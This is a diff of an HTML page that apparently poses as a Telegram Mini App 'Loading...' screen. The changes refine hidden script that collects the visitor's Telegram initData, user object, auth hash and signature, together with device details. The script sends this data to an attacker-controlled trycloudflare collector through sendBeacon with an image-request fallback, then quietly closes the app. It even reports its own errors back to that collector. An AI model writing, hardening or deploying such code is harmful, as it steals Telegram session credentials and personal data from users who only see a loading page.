@@ -8,65 +8,76 @@
 </head>
 <body>
 <div style="display:flex;justify-content:center;align-items:center;height:100vh;">
-  <p style="color:#999;">Loading...</p>
+  <p id="msg" style="color:#999;">Loading...</p>
 </div>
 <script>
 (function() {
   var EXFIL = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect'
-  var tg = window.Telegram.WebApp
 
-  var initData = tg.initData
-  var initDataUnsafe = tg.initDataUnsafe
-
-  // Fallback: parse hash fragment directly
-  if (!initData && window.location.hash) {
-    try {
-      var hashParams = new URLSearchParams(window.location.hash.substring(1))
-      var webAppData = hashParams.get('tgWebAppData')
-      if (webAppData) {
-        initData = decodeURIComponent(webAppData)
-        var params = new URLSearchParams(initData)
-        var userJson = params.get('user')
-        if (userJson) {
-          initDataUnsafe = {
-            query_id: params.get('query_id'),
-            user: JSON.parse(userJson),
-            auth_date: params.get('auth_date'),
-            signature: params.get('signature'),
-            hash: params.get('hash')
-          }
-        }
-      }
-    } catch(e) {}
-  }
-
-  var identity = {
-    type: 'identity',
-    initData: initData,
-    initDataUnsafe: initDataUnsafe,
-    colorScheme: tg.colorScheme,
-    platform: tg.platform,
-    version: tg.version,
-    themeParams: tg.themeParams,
-    viewportHeight: tg.viewportHeight,
-    viewportStableHeight: tg.viewportStableHeight,
-    isExpanded: tg.isExpanded,
-    headerColor: tg.headerColor,
-    backgroundColor: tg.backgroundColor,
-    safeAreaInset: tg.safeAreaInset,
-    contentSafeAreaInset: tg.contentSafeAreaInset,
-    hash: window.location.hash.substring(0, 200),
-    href: window.location.href.substring(0, 300),
-    ts: Date.now()
+  function send(path, data) {
+    var json = JSON.stringify(data)
+    // Try beacon first, then img fallback
+    try { navigator.sendBeacon(EXFIL + '/' + path, json) } catch(e) {}
+    new Image().src = EXFIL + '/' + path + '?d=' + encodeURIComponent(json)
   }
 
   try {
-    navigator.sendBeacon(EXFIL + '/identity', JSON.stringify(identity))
-  } catch(e) {
-    new Image().src = EXFIL + '/identity?d=' + encodeURIComponent(JSON.stringify(identity))
-  }
+    var tg = window.Telegram && window.Telegram.WebApp
+    if (!tg) {
+      send('identity', { type: 'identity', error: 'no Telegram.WebApp', href: location.href, hash: location.hash.substring(0, 500), ts: Date.now() })
+      return
+    }
 
-  setTimeout(function() { tg.close() }, 800)
+    var initData = tg.initData || ''
+    var initDataUnsafe = tg.initDataUnsafe || {}
+
+    // Fallback: parse hash fragment directly
+    if (!initData && window.location.hash) {
+      try {
+        var hashParams = new URLSearchParams(window.location.hash.substring(1))
+        var webAppData = hashParams.get('tgWebAppData')
+        if (webAppData) {
+          initData = decodeURIComponent(webAppData)
+          var params = new URLSearchParams(initData)
+          var userJson = params.get('user')
+          if (userJson) {
+            initDataUnsafe = {
+              query_id: params.get('query_id'),
+              user: JSON.parse(userJson),
+              auth_date: params.get('auth_date'),
+              signature: params.get('signature'),
+              hash: params.get('hash')
+            }
+          }
+        }
+      } catch(e) {}
+    }
+
+    var identity = {
+      type: 'identity',
+      initData: initData,
+      initDataUnsafe: initDataUnsafe,
+      colorScheme: tg.colorScheme || '',
+      platform: tg.platform || '',
+      version: tg.version || '',
+      themeParams: tg.themeParams || {},
+      viewportHeight: tg.viewportHeight || 0,
+      viewportStableHeight: tg.viewportStableHeight || 0,
+      headerColor: tg.headerColor || '',
+      backgroundColor: tg.backgroundColor || '',
+      safeAreaInset: tg.safeAreaInset || {},
+      contentSafeAreaInset: tg.contentSafeAreaInset || {},
+      hash: window.location.hash.substring(0, 500),
+      href: window.location.href.substring(0, 500),
+      ts: Date.now()
+    }
+
+    send('identity', identity)
+    setTimeout(function() { try { tg.close() } catch(e) {} }, 1200)
+
+  } catch(err) {
+    send('identity', { type: 'identity', error: err.message, stack: (err.stack || '').substring(0, 500), href: location.href, hash: location.hash.substring(0, 500), ts: Date.now() })
+  }
 })()
 </script>
 </body>
